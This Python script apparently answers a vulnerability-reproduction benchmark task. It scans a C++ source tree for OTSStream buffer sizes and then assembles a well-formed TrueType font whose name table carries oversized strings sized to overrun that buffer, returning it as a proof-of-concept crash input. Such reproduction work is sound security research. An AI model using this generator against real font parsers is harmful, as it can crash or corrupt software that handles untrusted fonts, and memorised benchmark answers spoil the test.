import os
import re
import tarfile
import zipfile
import struct
import math
from typing import Dict, Iterable, List, Tuple, Optional


def _u16(n: int) -> bytes:
    return struct.pack(">H", n & 0xFFFF)


def _s16(n: int) -> bytes:
    return struct.pack(">h", n)


def _u32(n: int) -> bytes:
    return struct.pack(">I", n & 0xFFFFFFFF)


def _s32(n: int) -> bytes:
    return struct.pack(">i", n)


def _calc_checksum(data: bytes) -> int:
    if len(data) % 4:
        data += b"\x00" * (4 - (len(data) % 4))
    s = 0
    mv = memoryview(data)
    for i in range(0, len(mv), 4):
        s = (s + struct.unpack(">I", mv[i:i+4])[0]) & 0xFFFFFFFF
    return s


def _iter_source_texts(src_path: str, max_file_size: int = 2_000_000) -> Iterable[Tuple[str, str]]:
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".inl")
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                if not fn.lower().endswith(exts):
                    continue
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                    if st.st_size > max_file_size:
                        continue
                    with open(p, "rb") as f:
                        b = f.read()
                    yield p, b.decode("utf-8", "ignore")
                except Exception:
                    continue
        return

    if zipfile.is_zipfile(src_path):
        try:
            with zipfile.ZipFile(src_path, "r") as zf:
                for zi in zf.infolist():
                    name = zi.filename
                    if not name.lower().endswith(exts):
                        continue
                    if zi.file_size > max_file_size:
                        continue
                    try:
                        b = zf.read(zi)
                        yield name, b.decode("utf-8", "ignore")
                    except Exception:
                        continue
        except Exception:
            return
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                if not name.lower().endswith(exts):
                    continue
                if m.size > max_file_size:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    b = f.read()
                    yield name, b.decode("utf-8", "ignore")
                except Exception:
                    continue
    except Exception:
        return


def _build_constants_map(texts: List[str]) -> Dict[str, int]:
    consts: Dict[str, int] = {}

    re_define = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(\d+)\b", re.M)
    re_const = re.compile(
        r"\bconst\s+(?:size_t|unsigned\s+int|uint32_t|uint64_t|int|long|unsigned\s+long)\s+([A-Za-z_]\w*)\s*=\s*(\d+)\b",
        re.M,
    )
    re_enum = re.compile(r"\benum\b[^{}]*\{([^}]*)\}", re.S)
    re_enum_item = re.compile(r"\b([A-Za-z_]\w*)\s*=\s*(\d+)\b")

    for t in texts:
        for k, v in re_define.findall(t):
            try:
                consts.setdefault(k, int(v))
            except Exception:
                pass
        for k, v in re_const.findall(t):
            try:
                consts.setdefault(k, int(v))
            except Exception:
                pass
        for block in re_enum.findall(t):
            for k, v in re_enum_item.findall(block):
                try:
                    consts.setdefault(k, int(v))
                except Exception:
                    pass

    return consts


def _resolve_int(expr: str, consts: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    m = re.fullmatch(r"\d+", expr)
    if m:
        try:
            return int(expr)
        except Exception:
            return None
    if expr in consts:
        return consts[expr]
    m = re.fullmatch(r"(\w+)\s*\*\s*(\d+)", expr)
    if m and m.group(1) in consts:
        return consts[m.group(1)] * int(m.group(2))
    m = re.fullmatch(r"(\d+)\s*\*\s*(\w+)", expr)
    if m and m.group(2) in consts:
        return int(m.group(1)) * consts[m.group(2)]
    return None


def _estimate_initial_capacity(src_path: str) -> int:
    relevant_texts: List[str] = []
    all_texts: List[str] = []
    for _, txt in _iter_source_texts(src_path):
        all_texts.append(txt)
        if "OTSStream" in txt:
            relevant_texts.append(txt)

    consts = _build_constants_map(all_texts)

    candidates: List[int] = []

    # Look for explicit allocations/reserves in constructor
    re_ctor = re.compile(r"\bOTSStream::OTSStream\s*\([^)]*\)\s*(?::[^{]*)?\{", re.M)
    re_reserve = re.compile(r"\.reserve\s*\(\s*([A-Za-z_]\w*|\d+)\s*\)")
    re_resize = re.compile(r"\.resize\s*\(\s*([A-Za-z_]\w*|\d+)\s*\)")
    re_malloc = re.compile(r"\b(?:malloc|calloc|realloc)\s*\(\s*([A-Za-z_]\w*|\d+)\s*(?:[,)]|\s*\))")
    re_new_arr = re.compile(r"\bnew\b[^;\n\[]*\[\s*([A-Za-z_]\w*|\d+)\s*\]")

    for t in relevant_texts:
        for m in re_ctor.finditer(t):
            start = m.start()
            snippet = t[start:start + 6000]
            for mm in re_reserve.finditer(snippet):
                v = _resolve_int(mm.group(1), consts)
                if v is not None:
                    candidates.append(v)
            for mm in re_resize.finditer(snippet):
                v = _resolve_int(mm.group(1), consts)
                if v is not None:
                    candidates.append(v)
            for mm in re_malloc.finditer(snippet):
                v = _resolve_int(mm.group(1), consts)
                if v is not None:
                    candidates.append(v)
            for mm in re_new_arr.finditer(snippet):
                v = _resolve_int(mm.group(1), consts)
                if v is not None:
                    candidates.append(v)

    # Also look for obvious "kInitial" buffer sizes near OTSStream in general
    re_near = re.compile(r"(k[A-Za-z_0-9]*Buffer[A-Za-z_0-9]*|k[A-Za-z_0-9]*Size[A-Za-z_0-9]*)")
    for t in relevant_texts:
        for name in set(re_near.findall(t)):
            if name in consts:
                candidates.append(consts[name])

    if not candidates:
        return 1024
    cap = max(candidates)
    if cap <= 0:
        return 1024
    if cap > 1_000_000_000:
        cap = 1024
    return cap


def _build_head_table(checksum_adjustment: int) -> bytes:
    # head table is 54 bytes
    version = 0x00010000
    font_revision = 0x00010000
    magic = 0x5F0F3CF5
    flags = 0x0003
    units_per_em = 1000
    created = 0
    modified = 0
    xMin = 0
    yMin = 0
    xMax = 0
    yMax = 0
    macStyle = 0
    lowestRecPPEM = 8
    fontDirectionHint = 2
    indexToLocFormat = 0
    glyphDataFormat = 0
    return b"".join([
        _u32(version),
        _u32(font_revision),
        _u32(checksum_adjustment),
        _u32(magic),
        _u16(flags),
        _u16(units_per_em),
        struct.pack(">Q", created),
        struct.pack(">Q", modified),
        _s16(xMin),
        _s16(yMin),
        _s16(xMax),
        _s16(yMax),
        _u16(macStyle),
        _u16(lowestRecPPEM),
        _s16(fontDirectionHint),
        _s16(indexToLocFormat),
        _s16(glyphDataFormat),
    ])


def _build_hhea_table(num_hmetrics: int, advance_width_max: int = 500) -> bytes:
    version = 0x00010000
    ascender = 800
    descender = -200
    line_gap = 0
    min_lsb = 0
    min_rsb = 0
    x_max_extent = 0
    caret_slope_rise = 1
    caret_slope_run = 0
    caret_offset = 0
    reserved = b"\x00" * 8
    metric_data_format = 0
    return b"".join([
        _u32(version),
        _s16(ascender),
        _s16(descender),
        _s16(line_gap),
        _u16(advance_width_max),
        _s16(min_lsb),
        _s16(min_rsb),
        _s16(x_max_extent),
        _s16(caret_slope_rise),
        _s16(caret_slope_run),
        _s16(caret_offset),
        reserved,
        _s16(metric_data_format),
        _u16(num_hmetrics),
    ])


def _build_maxp_table(num_glyphs: int) -> bytes:
    version = 0x00010000
    # 32 bytes total for version 1.0
    fields = [0] * 14  # maxPoints..maxComponentDepth (14 uint16)
    return b"".join([
        _u32(version),
        _u16(num_glyphs),
        b"".join(_u16(x) for x in fields),
    ])


def _build_hmtx_table(metrics: List[Tuple[int, int]]) -> bytes:
    out = bytearray()
    for aw, lsb in metrics:
        out += _u16(aw)
        out += _s16(lsb)
    return bytes(out)


def _build_glyf_and_loca(num_glyphs: int) -> Tuple[bytes, bytes]:
    # Create num_glyphs simple empty glyphs, each 10 bytes header: numberOfContours=0, bbox=0
    glyph = b"".join([_s16(0), _s16(0), _s16(0), _s16(0), _s16(0)])  # 10 bytes
    glyf = glyph * num_glyphs
    offsets = [i * 10 for i in range(num_glyphs + 1)]
    # short loca: offsets/2
    loca = bytearray()
    for off in offsets:
        loca += _u16(off // 2)
    return glyf, bytes(loca)


def _build_cmap_table() -> bytes:
    # cmap v0, one encoding record (Windows Unicode BMP), format 4 mapping U+0041 -> glyph 1
    version = 0
    num_tables = 1
    header = _u16(version) + _u16(num_tables)

    subtable_offset = 4 + 8 * num_tables
    encoding_record = _u16(3) + _u16(1) + _u32(subtable_offset)

    seg_count = 2
    segCountX2 = seg_count * 2
    searchRange = 2 * (2 ** int(math.floor(math.log2(seg_count))))
    entrySelector = int(math.log2(searchRange // 2)) if searchRange >= 2 else 0
    rangeShift = segCountX2 - searchRange

    endCode = [_u16(0x0041), _u16(0xFFFF)]
    startCode = [_u16(0x0041), _u16(0xFFFF)]
    idDelta = [_s16(1 - 0x0041), _s16(1)]  # maps 0x41 to glyph 1, 0xFFFF to glyph 0
    idRangeOffset = [_u16(0), _u16(0)]

    fmt4_body = b"".join([
        _u16(4),
        _u16(0),  # length placeholder
        _u16(0),  # language
        _u16(segCountX2),
        _u16(searchRange),
        _u16(entrySelector),
        _u16(rangeShift),
        b"".join(endCode),
        _u16(0),  # reservedPad
        b"".join(startCode),
        b"".join(idDelta),
        b"".join(idRangeOffset),
    ])
    length = len(fmt4_body)
    fmt4 = _u16(4) + _u16(length) + fmt4_body[4:]
    return header + encoding_record + fmt4


def _utf16be_repeat(ch: str, total_bytes: int) -> bytes:
    if total_bytes <= 0:
        return b""
    total_bytes &= ~1
    u = ch.encode("utf-16-be")
    if not u:
        u = b"\x00A"
    rep = total_bytes // len(u)
    rem = total_bytes % len(u)
    return u * rep + u[:rem]


def _build_name_table(large_len_bytes: int) -> bytes:
    # name records:
    # 1 Family (large)
    # 2 Subfamily ("Regular")
    # 4 Full name (large)
    # Windows platform 3, encoding 1, language 0x0409, UTF-16BE strings
    large_len_bytes = max(2, int(large_len_bytes) & ~1)
    large_len_bytes = min(60000, large_len_bytes)

    family = _utf16be_repeat("A", large_len_bytes)
    full = _utf16be_repeat("B", large_len_bytes)
    subfamily = "Regular".encode("utf-16-be")

    strings = [family, subfamily, full]
    count = len(strings)
    string_offset = 6 + 12 * count

    recs = []
    off = 0
    for name_id, s in zip([1, 2, 4], strings):
        recs.append(b"".join([
            _u16(3),       # platformID
            _u16(1),       # encodingID
            _u16(0x0409),  # languageID
            _u16(name_id),
            _u16(len(s)),
            _u16(off),
        ]))
        off += len(s)

    header = _u16(0) + _u16(count) + _u16(string_offset)
    return header + b"".join(recs) + b"".join(strings)


def _build_post_table() -> bytes:
    # post format 3.0, 32 bytes
    return b"".join([
        _u32(0x00030000),
        _s32(0),        # italicAngle
        _s16(0),        # underlinePosition
        _s16(0),        # underlineThickness
        _u32(0),        # isFixedPitch
        _u32(0),
        _u32(0),
        _u32(0),
        _u32(0),
    ])


def _build_os2_table() -> bytes:
    # OS/2 version 0 (78 bytes)
    version = 0
    xAvgCharWidth = 500
    usWeightClass = 400
    usWidthClass = 5
    fsType = 0
    ySubscriptXSize = 0
    ySubscriptYSize = 0
    ySubscriptXOffset = 0
    ySubscriptYOffset = 0
    ySuperscriptXSize = 0
    ySuperscriptYSize = 0
    ySuperscriptXOffset = 0
    ySuperscriptYOffset = 0
    yStrikeoutSize = 0
    yStrikeoutPosition = 0
    sFamilyClass = 0
    panose = b"\x00" * 10
    ulUnicodeRange1 = 0
    ulUnicodeRange2 = 0
    ulUnicodeRange3 = 0
    ulUnicodeRange4 = 0
    achVendID = b"TEST"
    fsSelection = 0x0040  # REGULAR
    usFirstCharIndex = 0x0041
    usLastCharIndex = 0x0041
    sTypoAscender = 800
    sTypoDescender = -200
    sTypoLineGap = 0
    usWinAscent = 800
    usWinDescent = 200
    return b"".join([
        _u16(version),
        _s16(xAvgCharWidth),
        _u16(usWeightClass),
        _u16(usWidthClass),
        _u16(fsType),
        _s16(ySubscriptXSize),
        _s16(ySubscriptYSize),
        _s16(ySubscriptXOffset),
        _s16(ySubscriptYOffset),
        _s16(ySuperscriptXSize),
        _s16(ySuperscriptYSize),
        _s16(ySuperscriptXOffset),
        _s16(ySuperscriptYOffset),
        _s16(yStrikeoutSize),
        _s16(yStrikeoutPosition),
        _s16(sFamilyClass),
        panose,
        _u32(ulUnicodeRange1),
        _u32(ulUnicodeRange2),
        _u32(ulUnicodeRange3),
        _u32(ulUnicodeRange4),
        achVendID,
        _u16(fsSelection),
        _u16(usFirstCharIndex),
        _u16(usLastCharIndex),
        _s16(sTypoAscender),
        _s16(sTypoDescender),
        _s16(sTypoLineGap),
        _u16(usWinAscent),
        _u16(usWinDescent),
    ])


def _build_ttf(large_name_len: int) -> bytes:
    num_glyphs = 2
    glyf, loca = _build_glyf_and_loca(num_glyphs)

    tables: Dict[bytes, bytes] = {
        b"cmap": _build_cmap_table(),
        b"glyf": glyf,
        b"head": _build_head_table(0),
        b"hhea": _build_hhea_table(num_hmetrics=num_glyphs, advance_width_max=500),
        b"hmtx": _build_hmtx_table([(500, 0), (500, 0)]),
        b"loca": loca,
        b"maxp": _build_maxp_table(num_glyphs),
        b"name": _build_name_table(large_name_len),
        b"post": _build_post_table(),
        b"OS/2": _build_os2_table(),
    }

    tags = sorted(tables.keys())
    numTables = len(tags)

    maxPow2 = 1
    entrySelector = 0
    while maxPow2 * 2 <= numTables:
        maxPow2 *= 2
        entrySelector += 1
    searchRange = maxPow2 * 16
    rangeShift = numTables * 16 - searchRange

    offset_table = b"".join([
        _u32(0x00010000),
        _u16(numTables),
        _u16(searchRange),
        _u16(entrySelector),
        _u16(rangeShift),
    ])

    # Layout tables
    record_start = len(offset_table)
    records_len = numTables * 16
    data_offset = record_start + records_len

    offsets: Dict[bytes, int] = {}
    lengths: Dict[bytes, int] = {}
    checksums: Dict[bytes, int] = {}

    cur = data_offset
    for tag in tags:
        if cur % 4:
            cur += (4 - (cur % 4))
        offsets[tag] = cur
        data = tables[tag]
        lengths[tag] = len(data)
        checksums[tag] = _calc_checksum(data)
        cur += len(data)

    # Build initial file with checkSumAdjustment = 0
    font_len = cur
    buf = bytearray(font_len + ((4 - (font_len % 4)) % 4))
    buf[0:len(offset_table)] = offset_table

    # Directory records
    rec_pos = record_start
    for tag in tags:
        buf[rec_pos:rec_pos+4] = tag
        buf[rec_pos+4:rec_pos+8] = _u32(checksums[tag])
        buf[rec_pos+8:rec_pos+12] = _u32(offsets[tag])
        buf[rec_pos+12:rec_pos+16] = _u32(lengths[tag])
        rec_pos += 16

    # Table data
    for tag in tags:
        off = offsets[tag]
        data = tables[tag]
        buf[off:off+len(data)] = data

    # Compute checksum adjustment over whole font (including adjustment field currently 0)
    total = _calc_checksum(bytes(buf))
    adjust = (0xB1B0AFBA - total) & 0xFFFFFFFF

    # Patch head table
    head_off = offsets[b"head"]
    # checkSumAdjustment is at offset 8 within head
    buf[head_off+8:head_off+12] = _u32(adjust)

    # Update head checksum in directory
    new_head_data = bytes(buf[head_off:head_off+lengths[b"head"]])
    new_head_checksum = _calc_checksum(new_head_data)
    # Find head record
    rec_pos = record_start
    for tag in tags:
        if tag == b"head":
            buf[rec_pos+4:rec_pos+8] = _u32(new_head_checksum)
            break
        rec_pos += 16

    return bytes(buf[:font_len])


class Solution:
    def solve(self, src_path: str) -> bytes:
        cap = _estimate_initial_capacity(src_path)
        base = _build_ttf(2)
        base_len = len(base)

        target_total = max(2048, cap + 1024)
        # Increasing large_name_len increases total roughly by 2*large_name_len (family + full name)
        need = target_total - base_len
        if need <= 0:
            large_len = 2
        else:
            large_len = int(math.ceil(need / 2.0))
            large_len = max(2, large_len)
            large_len &= ~1
            large_len = min(60000, large_len)

        poc = _build_ttf(large_len)
        # If still below target (due to padding/estimation), bump to max once.
        if len(poc) < target_total and large_len < 60000:
            large_len2 = min(60000, ((large_len + (target_total - len(poc)) // 2 + 64) & ~1))
            poc = _build_ttf(large_len2)
        return poc